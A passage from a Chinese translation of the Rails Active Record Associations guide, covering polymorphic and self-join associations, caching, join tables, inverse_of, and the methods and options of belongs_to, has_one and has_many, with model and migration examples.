如果需要做数据验证、回调，或者连接模型上要用到其他属性，此时就要使用 has_many :through 关联。
###  2.9 多态关联

关联还有一种高级用法，“多态关联”。在多态关联中，在同一个关联中，模型可以属于其他多个模型。例如，图片模型可以属于雇员模型或者产品模型，模型的定义如下：
class Picture < ActiveRecord::Base
  belongs_to :imageable, polymorphic: true
end
 
class Employee < ActiveRecord::Base
  has_many :pictures, as: :imageable
end
 
class Product < ActiveRecord::Base
  has_many :pictures, as: :imageable
end

在 belongs_to 中指定使用多态，可以理解成创建了一个接口，可供任何一个模型使用。在 Employee 模型实例上，可以使用 @employee.pictures 获取图片集合。类似地，可使用 @product.pictures 获取产品的图片。

在 Picture 模型的实例上，可以使用 @picture.imageable 获取父对象。不过事先要在声明多态接口的模型中创建外键字段和类型字段：
class CreatePictures < ActiveRecord::Migration
  def change
    create_table :pictures do |t|
      t.string  :name
      t.integer :imageable_id
      t.string  :imageable_type
      t.timestamps
    end
  end
end

上面的迁移可以使用 t.references 简化：
class CreatePictures < ActiveRecord::Migration
  def change
    create_table :pictures do |t|
      t.string :name
      t.references :imageable, polymorphic: true
      t.timestamps
    end
  end
end

多态关联
###  2.10 自连接

设计数据模型时会发现，有时模型要和自己建立关联。例如，在一个数据表中保存所有雇员的信息，但要建立经理和下属之间的关系。这种情况可以使用自连接关联解决：
class Employee < ActiveRecord::Base
  has_many :subordinates, class_name: "Employee",
                          foreign_key: "manager_id"
 
  belongs_to :manager, class_name: "Employee"
end

这样定义模型后，就可以使用 @employee.subordinates 和 @employee.manager 了。

在迁移中，要添加一个引用字段，指向模型自身：
class CreateEmployees < ActiveRecord::Migration
  def change
    create_table :employees do |t|
      t.references :manager
      t.timestamps
    end
  end
end

##  3 小技巧和注意事项

在 Rails 程序中高效地使用 Active Record 关联，要了解以下几个知识：

    缓存控制
    避免命名冲突
    更新模式
    控制关联的作用域
    Bi-directional associations

###  3.1 缓存控制

关联添加的方法都会使用缓存，记录最近一次查询结果，以备后用。缓存还会在方法之间共享。例如：
customer.orders                 # retrieves orders from the database
customer.orders.size            # uses the cached copy of orders
customer.orders.empty?          # uses the cached copy of orders

程序的其他部分会修改数据，那么应该怎么重载缓存呢？调用关联方法时传入 true 参数即可：
customer.orders                 # retrieves orders from the database
customer.orders.size            # uses the cached copy of orders
customer.orders(true).empty?    # discards the cached copy of orders
                                # and goes back to the database
###  3.2 避免命名冲突

关联的名字并不能随意使用。因为创建关联时，会向模型添加同名方法，所以关联的名字不能和 ActiveRecord::Base 中的实例方法同名。如果同名，关联方法会覆盖 ActiveRecord::Base 中的实例方法，导致错误。例如，关联的名字不能为 attributes 或 connection。

###  3.3 更新模式

关联非常有用，但没什么魔法。关联对应的数据库模式需要你自己编写。不同的关联类型，要做的事也不同。对 belongs_to 关联来说，要创建外键；对 has_and_belongs_to_many 来说，要创建相应的连接数据表。
####  3.3.1 创建 belongs_to 关联所需的外键

声明 belongs_to 关联后，要创建相应的外键。例如，有下面这个模型：
class Order < ActiveRecord::Base
  belongs_to :customer
end

这种关联需要在数据表中创建合适的外键：
class CreateOrders < ActiveRecord::Migration
  def change
    create_table :orders do |t|
      t.datetime :order_date
      t.string   :order_number
      t.integer  :customer_id
    end
  end
end

如果声明关联之前已经定义了模型，则要在迁移中使用 add_column 创建外键。
####  3.3.2 创建 has_and_belongs_to_many 关联所需的连接数据表

声明 has_and_belongs_to_many 关联后，必须手动创建连接数据表。除非在 :join_table 选项中指定了连接数据表的名字，否则 Active Record 会按照类名出现在字典中的顺序为数据表起名字。那么，顾客和订单模型使用的连接数据表默认名为“customers_orders”，因为在字典中，“c”在“o”前面。

模型名的顺序使用字符串的 < 操作符确定。所以，如果两个字符串的长度不同，比较最短长度时，两个字符串是相等的，但长字符串的排序比短字符串靠前。例如，你可能以为“"paper_boxes”和“papers”这两个表生成的连接表名为“papers_paper_boxes”，因为“paper_boxes”比“papers”长。其实生成的连接表名为“paper_boxes_papers”，因为在一般的编码方式中，“_”比“s”靠前。

不管名字是什么，你都要在迁移中手动创建连接数据表。例如下面的关联声明：
class Assembly < ActiveRecord::Base
  has_and_belongs_to_many :parts
end
 
class Part < ActiveRecord::Base
  has_and_belongs_to_many :assemblies
end

需要在迁移中创建 assemblies_parts 数据表，而且该表无主键：
class CreateAssembliesPartsJoinTable < ActiveRecord::Migration
  def change
    create_table :assemblies_parts, id: false do |t|
      t.integer :assembly_id
      t.integer :part_id
    end
  end
end

我们把 id: false 选项传给 create_table 方法，因为这个表不对应模型。只有这样，关联才能正常建立。如果在使用 has_and_belongs_to_many 关联时遇到奇怪的表现，例如提示模型 ID 损坏，或 ID 冲突，有可能就是因为创建了主键。

###  3.4 控制关联的作用域

默认情况下，关联只会查找当前模块作用域中的对象。如果在模块中定义 Active Record 模型，知道这一点很重要。例如：
module MyApplication
  module Business
    class Supplier < ActiveRecord::Base
       has_one :account
    end
 
    class Account < ActiveRecord::Base
       belongs_to :supplier
    end
  end
end

上面的代码能正常运行，因为 Supplier 和 Account 在同一个作用域内。但下面这段代码就不行了，因为 Supplier 和 Account 在不同的作用域中：
module MyApplication
  module Business
    class Supplier < ActiveRecord::Base
       has_one :account
    end
  end
 
  module Billing
    class Account < ActiveRecord::Base
       belongs_to :supplier
    end
  end
end

要想让处在不同命名空间中的模型正常建立关联，声明关联时要指定完整的类名：
module MyApplication
  module Business
    class Supplier < ActiveRecord::Base
       has_one :account,
        class_name: "MyApplication::Billing::Account"
    end
  end
 
  module Billing
    class Account < ActiveRecord::Base
       belongs_to :supplier,
        class_name: "MyApplication::Business::Supplier"
    end
  end
end
###  3.5 双向关联

一般情况下，都要求能在关联的两端进行操作。例如，有下面的关联声明：
class Customer < ActiveRecord::Base
  has_many :orders
end
 
class Order < ActiveRecord::Base
  belongs_to :customer
end

默认情况下，Active Record 并不知道这个关联中两个模型之间的联系。可能导致同一对象的两个副本不同步：
c = Customer.first
o = c.orders.first
c.first_name == o.customer.first_name # => true
c.first_name = 'Manny'
c.first_name == o.customer.first_name # => false

之所以会发生这种情况，是因为 c 和 o.customer 在内存中是同一数据的两钟表示，修改其中一个并不会刷新另一个。Active Record 提供了 :inverse_of 选项，可以告知 Rails 两者之间的关系：
class Customer < ActiveRecord::Base
  has_many :orders, inverse_of: :customer
end
 
class Order < ActiveRecord::Base
  belongs_to :customer, inverse_of: :orders
end

这么修改之后，Active Record 就只会加载一个顾客对象，避免数据的不一致性，提高程序的执行效率：
c = Customer.first
o = c.orders.first
c.first_name == o.customer.first_name # => true
c.first_name = 'Manny'
c.first_name == o.customer.first_name # => true

inverse_of 有些限制：

    不能和 :through 选项同时使用；
    不能和 :polymorphic 选项同时使用；
    不能和 :as 选项同时使用；
    在 belongs_to 关联中，会忽略 has_many 关联的 inverse_of 选项；

每种关联都会尝试自动找到关联的另一端，设置 :inverse_of 选项（根据关联的名字）。使用标准名字的关联都有这种功能。但是，如果在关联中设置了下面这些选项，将无法自动设置 :inverse_of：

    :conditions
    :through
    :polymorphic
    :foreign_key


##  4 关联详解

下面几节详细说明各种关联，包括添加的方法和声明关联时可以使用的选项。
###  4.1 belongs_to 关联详解

belongs_to 关联创建一个模型与另一个模型之间的一对一关系。用数据库的行话来说，就是这个类中包含了外键。如果外键在另一个类中，就应该使用 has_one 关联。
####  4.1.1 belongs_to 关联添加的方法

声明 belongs_to 关联后，所在的类自动获得了五个和关联相关的方法：

    association(force_reload = false)
    association=(associate)
    build_association(attributes = {})
    create_association(attributes = {})
    create_association!(attributes = {})

这五个方法中的 association 要替换成传入 belongs_to 方法的第一个参数。例如，如下的声明：
class Order < ActiveRecord::Base
  belongs_to :customer
end

每个 Order 模型实例都获得了这些方法：
customer
customer=
build_customer
create_customer
create_customer!

在 has_one 和 belongs_to 关联中，必须使用 build_* 方法构建关联对象。association.build 方法是在 has_many 和 has_and_belongs_to_many 关联中使用的。创建关联对象要使用 create_* 方法。
#####  4.1.1.1 association(force_reload = false)

如果关联的对象存在，association 方法会返回关联对象。如果找不到关联对象，则返回 nil。
@customer = @order.customer

如果关联对象之前已经取回，会返回缓存版本。如果不想使用缓存版本，强制重新从数据库中读取，可以把 force_reload 参数设为 true。
#####  4.1.1.2 association=(associate)

association= 方法用来赋值关联的对象。这个方法的底层操作是，从关联对象上读取主键，然后把值赋给该主键对应的对象。
@order.customer = @customer
#####  4.1.1.3 build_association(attributes = {})

build_association 方法返回该关联类型的一个新对象。这个对象使用传入的属性初始化，和对象连接的外键会自动设置，但关联对象不会存入数据库。
@customer = @order.build_customer(customer_number: 123,
                                  customer_name: "John Doe")
#####  4.1.1.4 create_association(attributes = {})

create_association 方法返回该关联类型的一个新对象。这个对象使用传入的属性初始化，和对象连接的外键会自动设置，只要能通过所有数据验证，就会把关联对象存入数据库。
@customer = @order.create_customer(customer_number: 123,
                                   customer_name: "John Doe")
#####  4.1.1.5 create_association!(attributes = {})

和 create_association 方法作用相同，但是如果记录不合法，会抛出 ActiveRecord::RecordInvalid 异常。


####  4.1.2 belongs_to 方法的选项

Rails 的默认设置足够智能，能满足常见需求。但有时还是需要定制 belongs_to 关联的行为。定制的方法很简单，声明关联时传入选项或者使用代码块即可。例如，下面的关联使用了两个选项：
class Order < ActiveRecord::Base
  belongs_to :customer, dependent: :destroy,
    counter_cache: true
end

belongs_to 关联支持以下选项：

    :autosave
    :class_name
    :counter_cache
    :dependent
    :foreign_key
    :inverse_of
    :polymorphic
    :touch
    :validate

#####  4.1.2.1 :autosave

如果把 :autosave 选项设为 true，保存父对象时，会自动保存所有子对象，并把标记为析构的子对象销毁。
#####  4.1.2.2 :class_name

如果另一个模型无法从关联的名字获取，可以使用 :class_name 选项指定模型名。例如，如果订单属于顾客，但表示顾客的模型是 Patron，就可以这样声明关联：
class Order < ActiveRecord::Base
  belongs_to :customer, class_name: "Patron"
end
#####  4.1.2.3 :counter_cache

:counter_cache 选项可以提高统计所属对象数量操作的效率。假如如下的模型：
class Order < ActiveRecord::Base
  belongs_to :customer
end
class Customer < ActiveRecord::Base
  has_many :orders
end

这样声明关联后，如果想知道 @customer.orders.size 的结果，就要在数据库中执行 COUNT(*) 查询。如果不想执行这个查询，可以在声明 belongs_to 关联的模型中加入计数缓存功能：
class Order < ActiveRecord::Base
  belongs_to :customer, counter_cache: true
end
class Customer < ActiveRecord::Base
  has_many :orders
end

这样声明关联后，Rails 会及时更新缓存，调用 size 方法时返回缓存中的值。

虽然 :counter_cache 选项在声明 belongs_to 关联的模型中设置，但实际使用的字段要添加到关联的模型中。针对上面的例子，要把 orders_count 字段加入 Customer 模型。这个字段的默认名也是可以设置的：
class Order < ActiveRecord::Base
  belongs_to :customer, counter_cache: :count_of_orders
end
class Customer < ActiveRecord::Base
  has_many :orders
end

计数缓存字段通过 attr_readonly 方法加入关联模型的只读属性列表中。
#####  4.1.2.4 :dependent

:dependent 选项的值有两个：

    :destroy：销毁对象时，也会在关联对象上调用 destroy 方法；
    :delete：销毁对象时，关联的对象不会调用 destroy 方法，而是直接从数据库中删除；

在 belongs_to 关联和 has_many 关联配对时，不应该设置这个选项，否则会导致数据库中出现孤儿记录。
#####  4.1.2.5 :foreign_key

按照约定，用来存储外键的字段名是关联名后加 _id。:foreign_key 选项可以设置要使用的外键名：
class Order < ActiveRecord::Base
  belongs_to :customer, class_name: "Patron",
                        foreign_key: "patron_id"
end

不管怎样，Rails 都不会自动创建外键字段，你要自己在迁移中创建。
#####  4.1.2.6 :inverse_of

:inverse_of 选项指定 belongs_to 关联另一端的 has_many 和 has_one 关联名。不能和 :polymorphic 选项一起使用。
class Customer < ActiveRecord::Base
  has_many :orders, inverse_of: :customer
end
 
class Order < ActiveRecord::Base
  belongs_to :customer, inverse_of: :orders
end
#####  4.1.2.7 :polymorphic

:polymorphic 选项为 true 时表明这是个多态关联。前文已经详细介绍过多态关联。
#####  4.1.2.8 :touch

如果把 :touch 选项设为 true，保存或销毁对象时，关联对象的 updated_at 或 updated_on 字段会自动设为当前时间戳。
class Order < ActiveRecord::Base
  belongs_to :customer, touch: true
end
 
class Customer < ActiveRecord::Base
  has_many :orders
end

在这个例子中，保存或销毁订单后，会更新关联的顾客中的时间戳。还可指定要更新哪个字段的时间戳：
class Order < ActiveRecord::Base
  belongs_to :customer, touch: :orders_updated_at
end
#####  4.1.2.9 :validate

如果把 :validate 选项设为 true，保存对象时，会同时验证关联对象。该选项的默认值是 false，保存对象时不验证关联对象。

####  4.1.3 belongs_to 的作用域

有时可能需要定制 belongs_to 关联使用的查询方式，定制的查询可在作用域代码块中指定。例如：
class Order < ActiveRecord::Base
  belongs_to :customer, -> { where active: true },
                        dependent: :destroy
end

在作用域代码块中可以使用任何一个标准的查询方法。下面分别介绍这几个方法：

    where
    includes
    readonly
    select

#####  4.1.3.1 where

where 方法指定关联对象必须满足的条件。
class Order < ActiveRecord::Base
  belongs_to :customer, -> { where active: true }
end
#####  4.1.3.2 includes

includes 方法指定使用关联时要按需加载的间接关联。例如，有如下的模型：
class LineItem < ActiveRecord::Base
  belongs_to :order
end
 
class Order < ActiveRecord::Base
  belongs_to :customer
  has_many :line_items
end
 
class Customer < ActiveRecord::Base
  has_many :orders
end

如果经常要直接从商品上获取顾客对象（@line_item.order.customer），就可以把顾客引入商品和订单的关联中：
class LineItem < ActiveRecord::Base
  belongs_to :order, -> { includes :customer }
end
 
class Order < ActiveRecord::Base
  belongs_to :customer
  has_many :line_items
end
 
class Customer < ActiveRecord::Base
  has_many :orders
end

直接关联没必要使用 includes。如果 Order belongs_to :customer，那么顾客会自动按需加载。
#####  4.1.3.3 readonly

如果使用 readonly，通过关联获取的对象就是只读的。
#####  4.1.3.4 select

select 方法会覆盖获取关联对象使用的 SQL SELECT 子句。默认情况下，Rails 会读取所有字段。

如果在 belongs_to 关联中使用 select 方法，应该同时设置 :foreign_key 选项，确保返回正确的结果。

####  4.1.4 检查关联的对象是否存在

检查关联的对象是否存在可以使用 association.nil? 方法：
if @order.customer.nil?
  @msg = "No customer found for this order"
end
####  4.1.5 什么时候保存对象

把对象赋值给 belongs_to 关联不会自动保存对象，也不会保存关联的对象。

###  4.2 has_one 关联详解

has_one 关联建立两个模型之间的一对一关系。用数据库的行话说，这种关联的意思是外键在另一个类中。如果外键在这个类中，应该使用 belongs_to 关联。
####  4.2.1 has_one 关联添加的方法

声明 has_one 关联后，声明所在的类自动获得了五个关联相关的方法：

    association(force_reload = false)
    association=(associate)
    build_association(attributes = {})
    create_association(attributes = {})
    create_association!(attributes = {})

这五个方法中的 association 要替换成传入 has_one 方法的第一个参数。例如，如下的声明：
class Supplier < ActiveRecord::Base
  has_one :account
end

每个 Supplier 模型实例都获得了这些方法：
account
account=
build_account
create_account
create_account!

在 has_one 和 belongs_to 关联中，必须使用 build_* 方法构建关联对象。association.build 方法是在 has_many 和 has_and_belongs_to_many 关联中使用的。创建关联对象要使用 create_* 方法。
#####  4.2.1.1 association(force_reload = false)

如果关联的对象存在，association 方法会返回关联对象。如果找不到关联对象，则返回 nil。
@account = @supplier.account

如果关联对象之前已经取回，会返回缓存版本。如果不想使用缓存版本，强制重新从数据库中读取，可以把 force_reload 参数设为 true。
#####  4.2.1.2 association=(associate)

association= 方法用来赋值关联的对象。这个方法的底层操作是，从关联对象上读取主键，然后把值赋给该主键对应的关联对象。
@supplier.account = @account
#####  4.2.1.3 build_association(attributes = {}) 
build_association 方法返回该关联类型的一个新对象。这个对象使用传入的属性初始化，和对象连接的外键会自动设置，但关联对象不会存入数据库。
@account = @supplier.build_account(terms: "Net 30")
#####  4.2.1.4 create_association(attributes = {})

create_association 方法返回该关联类型的一个新对象。这个对象使用传入的属性初始化，和对象连接的外键会自动设置，只要能通过所有数据验证，就会把关联对象存入数据库。
@account = @supplier.create_account(terms: "Net 30")
#####  4.2.1.5 create_association!(attributes = {})

和 create_association 方法作用相同，但是如果记录不合法，会抛出 ActiveRecord::RecordInvalid 异常。

####  4.2.2 has_one 方法的选项

Rails 的默认设置足够智能，能满足常见需求。但有时还是需要定制 has_one 关联的行为。定制的方法很简单，声明关联时传入选项即可。例如，下面的关联使用了两个选项：
class Supplier < ActiveRecord::Base
  has_one :account, class_name: "Billing", dependent: :nullify
end

has_one 关联支持以下选项：

    :as
    :autosave
    :class_name
    :dependent
    :foreign_key
    :inverse_of
    :primary_key
    :source
    :source_type
    :through
    :validate

#####  4.2.2.1 :as

:as 选项表明这是多态关联。前文已经详细介绍过多态关联。
#####  4.2.2.2 :autosave

如果把 :autosave 选项设为 true，保存父对象时，会自动保存所有子对象，并把标记为析构的子对象销毁。
#####  4.2.2.3 :class_name

如果另一个模型无法从关联的名字获取，可以使用 :class_name 选项指定模型名。例如，供应商有一个账户，但表示账户的模型是 Billing，就可以这样声明关联：
class Supplier < ActiveRecord::Base
  has_one :account, class_name: "Billing"
end
#####  4.2.2.4 :dependent

设置销毁拥有者时要怎么处理关联对象：

    :destroy：也销毁关联对象；
    :delete：直接把关联对象对数据库中删除，因此不会执行回调；
    :nullify：把外键设为 NULL，不会执行回调；
    :restrict_with_exception：有关联的对象时抛出异常；
    :restrict_with_error：有关联的对象时，向拥有者添加一个错误；

如果在数据库层设置了 NOT NULL 约束，就不能使用 :nullify 选项。如果 :dependent 选项没有销毁关联，就无法修改关联对象，因为关联对象的外键设置为不接受 NULL。
#####  4.2.2.5 :foreign_key

按照约定，在另一个模型中用来存储外键的字段名是模型名后加 _id。:foreign_key 选项可以设置要使用的外键名：
class Supplier < ActiveRecord::Base
  has_one :account, foreign_key: "supp_id"
end

不管怎样，Rails 都不会自动创建外键字段，你要自己在迁移中创建。
#####  4.2.2.6 :inverse_of

:inverse_of 选项指定 has_one 关联另一端的 belongs_to 关联名。不能和 :through 或 :as 选项一起使用。
class Supplier < ActiveRecord::Base
  has_one :account, inverse_of: :supplier
end
 
class Account < ActiveRecord::Base
  belongs_to :supplier, inverse_of: :account
end
#####  4.2.2.7 :primary_key

按照约定，用来存储该模型主键的字段名 id。:primary_key 选项可以设置要使用的主键名。
#####  4.2.2.8 :source

:source 选项指定 has_one :through 关联的关联源名字。
#####  4.2.2.9 :source_type

:source_type 选项指定 has_one :through 关联中用来处理多态关联的关联源类型。
#####  4.2.2.10 :through

:through 选项指定用来执行查询的连接模型。前文详细介绍过 has_one :through 关联。
#####  4.2.2.11 :validate

如果把 :validate 选项设为 true，保存对象时，会同时验证关联对象。该选项的默认值是 false，保存对象时不验证关联对象。

####  4.2.3 has_one 的作用域

有时可能需要定制 has_one 关联使用的查询方式，定制的查询可在作用域代码块中指定。例如：
class Supplier < ActiveRecord::Base
  has_one :account, -> { where active: true }
end

在作用域代码块中可以使用任何一个标准的查询方法。下面分别介绍这几个方法：

    where
    includes
    readonly
    select

#####  4.2.3.1 where

where 方法指定关联对象必须满足的条件。
class Supplier < ActiveRecord::Base
  has_one :account, -> { where "confirmed = 1" }
end
#####  4.2.3.2 includes

includes 方法指定使用关联时要按需加载的间接关联。例如，有如下的模型：
class Supplier < ActiveRecord::Base
  has_one :account
end
 
class Account < ActiveRecord::Base
  belongs_to :supplier
  belongs_to :representative
end
 
class Representative < ActiveRecord::Base
  has_many :accounts
end

如果经常要直接获取供应商代表（@supplier.account.representative），就可以把代表引入供应商和账户的关联中：
class Supplier < ActiveRecord::Base
  has_one :account, -> { includes :representative }
end
 
class Account < ActiveRecord::Base
  belongs_to :supplier
  belongs_to :representative
end
 
class Representative < ActiveRecord::Base
  has_many :accounts
end
#####  4.2.3.3 readonly

如果使用 readonly，通过关联获取的对象就是只读的。
#####  4.2.3.4 select

select 方法会覆盖获取关联对象使用的 SQL SELECT 子句。默认情况下，Rails 会读取所有字段。

####  4.2.4 检查关联的对象是否存在

检查关联的对象是否存在可以使用 association.nil? 方法：
if @supplier.account.nil?
  @msg = "No account found for this supplier"
end
####  4.2.5 什么时候保存对象

把对象赋值给 has_one 关联时，会自动保存对象（因为要更新外键）。而且所有被替换的对象也会自动保存，因为外键也变了。

如果无法通过验证，随便哪一次保存失败了，赋值语句就会返回 false，赋值操作会取消。

如果父对象（has_one 关联声明所在的模型）没保存（new_record? 方法返回 true），那么子对象也不会保存。只有保存了父对象，才会保存子对象。

如果赋值给 has_one 关联时不想保存对象，可以使用 association.build 方法。

###  4.3 has_many 关联详解

has_many 关联建立两个模型之间的一对多关系。用数据库的行话说，这种关联的意思是外键在另一个类中，指向这个类的实例。
####  4.3.1 has_many 关联添加的方法

声明 has_many 关联后，声明所在的类自动获得了 16 个关联相关的方法：

    collection(force_reload = false)
    collection<<(object, ...)
    collection.delete(object, ...)
    collection.destroy(object, ...)
    collection=objects
    collection_singular_ids
    collection_singular_ids=ids
    collection.clear
    collection.empty?
    collection.size
    collection.find(...)
    collection.where(...)
    collection.exists?(...)
    collection.build(attributes = {}, ...)
    collection.create(attributes = {})
    collection.create!(attributes = {})

这些个方法中的 collection 要替换成传入 has_many 方法的第一个参数。collection_singular 要替换成第一个参数的单数形式。例如，如下的声明：
class Customer < ActiveRecord::Base
  has_many :orders
end

每个 Customer 模型实例都获得了这些方法：
orders(force_reload = false)
orders<<(object, ...)
orders.delete(object, ...)
orders.destroy(object, ...)
orders=objects
order_ids
order_ids=ids
orders.clear
orders.empty?
orders.size
orders.find(...)
orders.where(...)
orders.exists?(...)
orders.build(attributes = {}, ...)
orders.create(attributes = {})
orders.create!(attributes = {})
#####  4.3.1.1 collection(force_reload = false)

collection 方法返回一个数组，包含所有关联的对象。如果没有关联的对象，则返回空数组。
@orders = @customer.orders
#####  4.3.1.2 collection<<(object, ...)

collection<< 方法向关联对象数组中添加一个或多个对象，并把各所加对象的外键设为调用此方法的模型的主键。
@customer.orders << @order1
#####  4.3.1.3 collection.delete(object, ...)

collection.delete 方法从关联对象数组中删除一个或多个对象，并把删除的对象外键设为 NULL。
@customer.orders.delete(@order1)

如果关联设置了 dependent: :destroy，还会销毁关联对象；如果关联设置了 dependent: :delete_all，还会删除关联对象。
#####  4.3.1.4 collection.destroy(object, ...)

collection.destroy 方法在关联对象上调用 destroy 方法，从关联对象数组中删除一个或多个对象。
@customer.orders.destroy(@order1)

对象会从数据库中删除，忽略 :dependent 选项。
#####  4.3.1.5 collection=objects

collection= 让关联对象数组只包含指定的对象，根据需求会添加或删除对象。
#####  4.3.1.6 collection_singular_ids

collection_singular_ids 返回一个数组，包含关联对象数组中各对象的 ID。
@order_ids = @customer.order_ids
#####  4.3.1.7 collection_singular_ids=ids

collection_singular_ids= 方法让数组中只包含指定的主键，根据需要增删 ID。
#####  4.3.1.8 collection.clear

collection.clear 方法删除数组中的所有对象。如果关联中指定了 dependent: :destroy 选项，会销毁关联对象；如果关联中指定了 dependent: :delete_all 选项，会直接从数据库中删除对象，然后再把外键设为 NULL。
#####  4.3.1.9 collection.empty?

如果关联数组中没有关联对象，collection.empty? 方法返回 true。
<% if @customer.orders.empty? %>
  No Orders Found
<% end %>
#####  4.3.1.10 collection.size

collection.size 返回关联对象数组中的对象数量。
@order_count = @customer.orders.size
#####  4.3.1.11 collection.find(...)

collection.find 方法在关联对象数组中查找对象，句法和可用选项跟 ActiveRecord::Base.find 方法一样。
@open_orders = @customer.orders.find(1)
#####  4.3.1.12 collection.where(...)

collection.where 方法根据指定的条件在关联对象数组中查找对象，但会惰性加载对象，用到对象时才会执行查询。
@open_orders = @customer.orders.where(open: true) # No query yet
@open_order = @open_orders.first # Now the database will be queried
#####  4.3.1.13 collection.exists?(...)

collection.exists? 方法根据指定的条件检查关联对象数组中是否有符合条件的对象，句法和可用选项跟 ActiveRecord::Base.exists? 方法一样。
#####  4.3.1.14 collection.build(attributes = {}, ...)

collection.build 方法返回一个或多个此种关联类型的新对象。这些对象会使用传入的属性初始化，还会创建对应的外键，但不会保存关联对象。
@order = @customer.orders.build(order_date: Time.now,
                                order_number: "A12345")
#####  4.3.1.15 collection.create(attributes = {})

collection.create 方法返回一个此种关联类型的新对象。这个对象会使用传入的属性初始化，还会创建对应的外键，只要能通过所有数据验证，就会保存关联对象。
@order = @customer.orders.create(order_date: Time.now,
                                 order_number: "A12345")
#####  4.3.1.16 collection.create!(attributes = {})

作用和 collection.create 相同，但如果记录不合法会抛出 ActiveRecord::RecordInvalid 异常。

####  4.3.2 has_many 方法的选项

Rails 的默认设置足够智能，能满足常见需求。但有时还是需要定制 has_many 关联的行为。定制的方法很简单，声明关联时传入选项即可。例如，下面的关联使用了两个选项：
class Customer < ActiveRecord::Base
  has_many :orders, dependent: :delete_all, validate: :false
end

has_many 关联支持以下选项：

    :as
    :autosave
    :class_name
    :dependent
    :foreign_key
    :inverse_of
    :primary_key
    :source
    :source_type
    :through
    :validate

#####  4.3.2.1 :as

:as 选项表明这是多态关联。前文已经详细介绍过多态关联。
#####  4.3.2.2 :autosave

如果把 :autosave 选项设为 true，保存父对象时，会自动保存所有子对象，并把标记为析构的子对象销毁。
#####  4.3.2.3 :class_name

如果另一个模型无法从关联的名字获取，可以使用 :class_name 选项指定模型名。例如，顾客有多个订单，但表示订单的模型是 Transaction，就可以这样声明关联：
class Customer < ActiveRecord::Base
  has_many :orders, class_name: "Transaction"
end
#####  4.3.2.4 :dependent

设置销毁拥有者时要怎么处理关联对象：

    :destroy：也销毁所有关联的对象；
    :delete_all：直接把所有关联对象对数据库中删除，因此不会执行回调；
    :nullify：把外键设为 NULL，不会执行回调；
    :restrict_with_exception：有关联的对象时抛出异常；
    :restrict_with_error：有关联的对象时，向拥有者添加一个错误；

如果声明关联时指定了 :through 选项，会忽略这个选项。
#####  4.3.2.5 :foreign_key

按照约定，另一个模型中用来存储外键的字段名是模型名后加 _id。:foreign_key 选项可以设置要使用的外键名：
class Customer < ActiveRecord::Base
  has_many :orders, foreign_key: "cust_id"
end

不管怎样，Rails 都不会自动创建外键字段，你要自己在迁移中创建。
#####  4.3.2.6 :inverse_of

:inverse_of 选项指定 has_many 关联另一端的 belongs_to 关联名。不能和 :through 或 :as 选项一起使用。
class Customer < ActiveRecord::Base
  has_many :orders, inverse_of: :customer
end
 
class Order < ActiveRecord::Base
  belongs_to :customer, inverse_of: :orders
end
#####  4.3.2.7 :primary_key

按照约定，用来存储该模型主键的字段名 id。:primary_key 选项可以设置要使用的主键名。

假设 users 表的主键是 id，但还有一个 guid 字段。根据要求，todos 表中应该使用 guid 字段，而不是 id 字段。这种需求可以这么实现：
class User < ActiveRecord::Base
  has_many :todos, primary_key: :guid
end

如果执行 @user.todos.create 创建新的待办事项，那么 @todo.user_id 就是 guid 字段中的值。
#####  4.3.2.8 :source

:source 选项指定 has_many :through 关联的关联源名字。只有无法从关联名种解出关联源的名字时才需要设置这个选项。
#####  4.3.2.9 :source_type

:source_type 选项指定 has_many :through 关联中用来处理多态关联的关联源类型。
#####  4.3.2.10 :through

:through 选项指定用来执行查询的连接模型。has_many :through 关联是实现多对多关联的一种方式，前文已经介绍过。
#####  4.3.2.11 :validate

如果把 :validate 选项设为 false，保存对象时，不会验证关联对象。该选项的默认值是 true，保存对象验证关联的对象。

####  4.3.3 has_many 的作用域

有时可能需要定制 has_many 关联使用的查询方式，定制的查询可在作用域代码块中指定。例如：
class Customer < ActiveRecord::Base
  has_many :orders, -> { where processed: true }
end

在作用域代码块中可以使用任何一个标准的查询方法。下面分别介绍这几个方法：

    where
    extending
    group
    includes
    limit
    offset
    order
    readonly
    select
    uniq

#####  4.3.3.1 where

where 方法指定关联对象必须满足的条件。
class Customer < ActiveRecord::Base
  has_many :confirmed_orders, -> { where "confirmed = 1" },
    class_name: "Order"
end

条件还可以使用 Hash 的形式指定：
class Customer < ActiveRecord::Base
  has_many :confirmed_orders, -> { where confirmed: true },
                              class_name: "Order"
end

如果 where 使用 Hash 形式，通过这个关联创建的记录会自动使用 Hash 中的作用域。针对上面的例子，使用 @customer.confirmed_orders.create 或 @customer.confirmed_orders.build 创建订单时，会自动把 confirmed 字段的值设为 true。
#####  4.3.3.2 extending

extending 方法指定一个模块名，用来扩展关联代理。后文会详细介绍关联扩展。
#####  4.3.3.3 group

group 方法指定一个属性名，用在 SQL GROUP BY 子句中，分组查询结果。
class Customer < ActiveRecord::Base
  has_many :line_items, -> { group 'orders.id' },
                        through: :orders
end
#####  4.3.3.4 includes

includes 方法指定使用关联时要按需加载的间接关联。例如，有如下的模型：
class Customer < ActiveRecord::Base
  has_many :orders
end
 
class Order < ActiveRecord::Base
  belongs_to :customer
  has_many :line_items
end
 
class LineItem < ActiveRecord::Base
  belongs_to :order
end

如果经常要直接获取顾客购买的商品（@customer.orders.line_items），就可以把商品引入顾客和订单的关联中：
class Customer < ActiveRecord::Base
  has_many :orders, -> { includes :line_items }
end
 
class Order < ActiveRecord::Base
  belongs_to :customer
  has_many :line_items
end
 
class LineItem < ActiveRecord::Base
  belongs_to :order
end
#####  4.3.3.5 limit

limit 方法限制通过关联获取的对象数量。
class Customer < ActiveRecord::Base
  has_many :recent_orders,
    -> { order('order_date desc').limit(100) },
    class_name: "Order",
end
#####  4.3.3.6 offset

offset 方法指定通过关联获取对象时的偏移量。例如，-> { offset(11) } 会跳过前 11 个记录。
#####  4.3.3.7 order

order 方法指定获取关联对象时使用的排序方式，用于 SQL ORDER BY 子句。
class Customer < ActiveRecord::Base
  has_many :orders, -> { order "date_confirmed DESC" }
end
#####  4.3.3.8 readonly

如果使用 readonly，通过关联获取的对象就是只读的。
#####  4.3.3.9 select

select 方法用来覆盖获取关联对象数据的 SQL SELECT 子句。默认情况下，Rails 会读取所有字段。

如果设置了 select，记得要包含主键和关联模型的外键。否则，Rails 会抛出异常。
#####  4.3.3.10 distinct

使用 distinct 方法可以确保集合中没有重复的对象，和 :through 选项一起使用最有用。
class Person < ActiveRecord::Base
  has_many :readings
  has_many :posts, through: :readings
end
 
person = Person.create(name: 'John')
post   = Post.create(name: 'a1')
person.posts << post
person.posts << post
